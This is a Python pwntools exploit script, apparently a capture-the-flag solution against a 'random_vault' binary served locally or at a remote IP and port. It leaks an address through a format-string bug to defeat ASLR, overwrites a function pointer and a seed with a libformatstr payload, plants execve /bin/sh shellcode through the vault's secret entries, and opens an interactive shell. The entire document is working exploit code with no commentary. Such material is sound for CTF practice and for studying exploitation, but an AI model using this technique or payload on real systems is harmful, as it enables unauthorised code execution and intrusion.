#!/usr/bin/env python3
from pwn import *
from libformatstr import FormatStr

default_fn_off = 0x124b
greet_ret_off = 0x1750
fn_off = 0x5000
seed_off = 0x5008
secrets_off = 0x5010
# https://www.exploit-db.com/exploits/42179
shellcode_bytes = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
assert len(shellcode_bytes) == 24
values = struct.unpack('<QQQ', shellcode_bytes)
seed_val = 41  # [109, 178, 76, 77, 250, 75, 85]
first_index = 75
secrets = [0, 0, values[1], values[2], 0, values[0], 0]
shellcode_off = secrets_off + first_index * 8

if args.LOCAL:
    io = process(['./random_vault.dbg'])
else:
    io = connect('200.136.252.34', 1245)
io.recvuntil('Username:')
io.sendline('%11$p')
io.recvuntil('Hello, ')
greet_ret = int(io.recvline(), 0)
exe_base = greet_ret - greet_ret_off
fn = exe_base + fn_off
seed = exe_base + seed_off
shellcode = exe_base + shellcode_off
default_fn = exe_base + default_fn_off
log.info('exe_base   = 0x%x', exe_base)
log.info('fn         = 0x%x', fn)
log.info('seed       = 0x%x', seed)
log.info('shellcode  = 0x%x', shellcode)
log.info('default_fn = 0x%x', default_fn)
shellcode = struct.pack('<Q', shellcode)
default_fn = struct.pack('<Q', default_fn)
for i in reversed(range(7)):
    if shellcode[i] != default_fn[i]:
        break
i += 1
log.info('i          = %d', i)
io.recvuntil('4. Quit')
io.sendline('1')
io.recvuntil('Username:')
fmt = FormatStr(isx64=1)
fmt[fn] = shellcode[:i]
fmt[seed] = struct.pack('<I', seed_val)
payload = fmt.payload(24)
log.info('payload    = %s', payload)
assert len(payload) < 80
io.sendline(payload)
io.recvuntil('4. Quit')
io.sendline('2')
for i in range(7):
    io.recvuntil(f'Secret #{i + 1}:')
    io.sendline(str(secrets[i]))
io.interactive()
